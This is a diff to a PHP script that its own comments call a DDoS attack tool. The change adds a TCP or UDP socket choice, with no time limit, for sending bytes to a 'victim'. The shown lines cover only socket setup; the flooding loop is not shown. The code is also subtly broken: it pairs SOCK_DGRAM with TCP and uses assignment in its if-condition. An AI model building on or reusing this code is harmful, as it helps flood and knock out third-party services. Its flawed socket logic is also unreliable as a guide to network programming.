@@ -759,25 +759,59 @@ line-height:2;
 
 
 
-      // Timeout for send bytes(again and again)
-       set_time_limit(0);
+         // Timeout for send bytes(again and again)
+         set_time_limit(0);
+
+  
+   
+         /* Create socket for ddos atack
+          *
+          * AF_INET IPv4 Internet based protocols. TCP and UDP are common protocols of this protocol family.
+          *
+          * SOCK_STREAM Provides sequenced, reliable, full-duplex, connection-based byte streams. 
+          * An out-of-band data transmission mechanism may be supported. The TCP protocol is based on this socket type.
+          *
+          * udp	The User Datagram Protocol is a connectionless, unreliable, protocol with fixed record lengths.
+          * Due to these aspects, UDP requires a minimum amount of protocol overhead.
+          *
+          * tcp	The Transmission Control Protocol is a reliable, connection based, stream oriented, full duplex protocol. 
+          * TCP guarantees that all data packets will be received in the order in which they were sent. 
+          * If any packet is somehow lost during communication, TCP will automatically retransmit the packet 
+          * until the destination host acknowledges that packet. For reliability and performance reasons, 
+          * the TCP implementation itself decides the appropriate octet boundaries 
+          * of the underlying datagram communication layer. 
+          * Therefore, TCP applications must allow for the possibility of partial record transmission.
+          */
+
+         /* Check for protocol udp or tcp to create socket */
+
+       if ($protocol_u == "TCP")
+           {
+          // create socket for connection tcp
+            $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_TCP);
+            }
 
 
+         else if ($protocol_u == "UDP")
+            { 
 
-      // create socket for connection
+            // create socket for connection udp
+            // check for udp classes 
 
          if ($domain = 'AF_INET' && $type = 'SOCK_DGRAM' && $protocol = 'SOL_UDP')
            {
-      $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+          $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
             }
 
-            else
+           else
              {
-          $errorcode = socket_last_error();
-          $errormsg = socket_strerror($errorcode);
+            $errorcode = socket_last_error();
+            $errormsg = socket_strerror($errorcode);
     
       die("Couldn't create socket: [$errorcode] $errormsg");
               }
+
+             }
         
 
     // for socket send data (bytes(binary)) to victim
